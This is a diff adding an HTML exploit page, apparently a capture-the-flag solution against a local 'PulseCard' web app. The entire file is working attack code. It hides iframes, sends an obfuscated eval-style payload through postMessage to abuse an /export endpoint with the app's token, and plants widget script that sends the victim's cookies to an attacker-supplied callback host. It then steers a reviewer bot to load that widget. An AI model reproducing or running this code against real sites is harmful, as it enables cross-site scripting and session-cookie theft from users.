@@ -1,0 +1,72 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>PulseCard runner</title>
+<body>PulseCard runner</body>
+<script>
+(() => {
+  const qs = new URLSearchParams(location.search);
+  const CB = qs.get('cb');
+  if (!CB) { document.body.textContent = 'missing cb'; return; }
+
+  function hit(stage, extra) {
+    try {
+      const q = new URLSearchParams(Object.assign({stage}, extra || {}));
+      (new Image()).src = CB + (CB.includes('?') ? '&' : '?') + q.toString();
+    } catch (e) {}
+  }
+  function pct(s) {
+    let out = '';
+    for (const ch of s) out += '%' + ch.charCodeAt(0).toString(16).padStart(2, '0');
+    return out;
+  }
+
+  hit('top_loaded', {href: location.href.slice(0, 160)});
+
+  const p = document.createElement('iframe');
+  p.id = 'p';
+  p.src = 'http://localhost:5000/preview';
+  p.style = 'width:1px;height:1px;border:0;position:absolute;left:-20px;top:-20px';
+  document.body.appendChild(p);
+
+  const s = document.createElement('iframe');
+  s.id = 's';
+  s.setAttribute('sandbox', 'allow-scripts');
+  s.style = 'width:1px;height:1px;border:0;position:absolute;left:-20px;top:-20px';
+  document.body.appendChild(s);
+
+  const leakPrefix = CB + (CB.includes('?') ? '&' : '?') + 'stage=leak&c=';
+  const widgetJS = 'location=' + JSON.stringify(leakPrefix) + '+encodeURIComponent(document.cookie)';
+  const body = "fetch('/export',{method:'POST',headers:{'X-Card-Token':CARD_TOKEN,'Content-Type':'application/javascript'},body:" + JSON.stringify(widgetJS) + "}).then(r=>r.text()).then(n=>parent.postMessage(n,'*'))";
+  const payload = '[]["fill"]["con"+"structor"](unescape("' + pct(body) + '"))()';
+
+  let started = false;
+  function startSender() {
+    if (started) return;
+    started = true;
+    hit('preview_loaded');
+    s.srcdoc = `<script>
+      const p = ${JSON.stringify(payload)};
+      let n = 0;
+      const t = setInterval(() => {
+        try { parent.frames[0].postMessage(p, '*'); } catch (e) {}
+        if (++n > 80) clearInterval(t);
+      }, 120);
+    <\/script>`;
+  }
+
+  p.addEventListener('load', () => setTimeout(startSender, 250));
+  setTimeout(startSender, 1800);
+
+  addEventListener('message', (e) => {
+    const n = String(e.data || '');
+    if (/^[A-Za-z0-9_-]+\.js$/.test(n)) {
+      hit('got_widget', {n});
+      setTimeout(() => {
+        location = 'http://localhost:5000/review?widget=' + encodeURIComponent(n);
+      }, 250);
+    } else {
+      hit('msg', {m: n.slice(0,80)});
+    }
+  });
+})();
+</script>
